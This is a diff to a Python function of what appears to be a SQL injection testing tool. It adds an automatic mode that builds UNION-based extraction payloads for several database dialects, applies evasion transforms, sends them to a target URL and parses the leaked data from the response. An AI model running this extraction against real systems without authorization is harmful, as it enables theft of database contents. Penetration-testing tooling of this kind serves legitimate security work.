@@ -245,18 +245,23 @@ def extract_via_union(
     if dbms in ("sqlite", "postgres", "postgresql", "oracle"):
         cast   = f"CAST(({expr}) AS TEXT)"
         concat = f"'{_UNION_PREFIX}'||{cast}||'{_UNION_SUFFIX}'"
+        concat_candidates = [concat]
     elif dbms == "mssql":
         cast   = f"CAST(({expr}) AS NVARCHAR(MAX))"
         concat = f"'{_UNION_PREFIX}'+{cast}+'{_UNION_SUFFIX}'"
+        concat_candidates = [concat]
+    elif dbms == "auto":
+        # Try pipe concat first (SQLite / PostgreSQL / Oracle), then CONCAT (MySQL / MariaDB)
+        cast_text = f"CAST(({expr}) AS TEXT)"
+        cast_char = f"CAST(({expr}) AS CHAR)"
+        concat_candidates = [
+            f"'{_UNION_PREFIX}'||{cast_text}||'{_UNION_SUFFIX}'",
+            f"CONCAT('{_UNION_PREFIX}',{cast_char},'{_UNION_SUFFIX}')",
+        ]
     else:
         cast   = f"CAST(({expr}) AS CHAR)"
         concat = f"CONCAT('{_UNION_PREFIX}',{cast},'{_UNION_SUFFIX}')"
-
-    new_payload = _MARKER_RE.sub(concat, union_finding.payload, count=1)
-    if new_payload == union_finding.payload:
-        return ""
-
-    new_payload = apply_evasion(new_payload, evasion)
+        concat_candidates = [concat]
 
     url        = surface["url"]
     method     = surface["method"]
@@ -266,14 +271,24 @@ def extract_via_union(
     path_index = surface.get("path_index", 0)
     second_url = getattr(opts, "second_url", "")
 
-    resp = _fetch(injector, url, method, params, param, new_payload,
-                  second_url=second_url, json_body=json_body, path_index=path_index)
-    if not resp:
-        return ""
-
-    m = _re.search(
+    _pat = _re.compile(
         _re.escape(_UNION_PREFIX) + r"(.*?)" + _re.escape(_UNION_SUFFIX),
-        resp,
         _re.DOTALL,
     )
-    return m.group(1) if m else ""
+
+    for concat in concat_candidates:
+        new_payload = _MARKER_RE.sub(concat, union_finding.payload, count=1)
+        if new_payload == union_finding.payload:
+            return ""
+
+        new_payload = apply_evasion(new_payload, evasion)
+        resp = _fetch(injector, url, method, params, param, new_payload,
+                      second_url=second_url, json_body=json_body, path_index=path_index)
+        if not resp:
+            continue
+
+        m = _pat.search(resp)
+        if m:
+            return m.group(1)
+
+    return ""
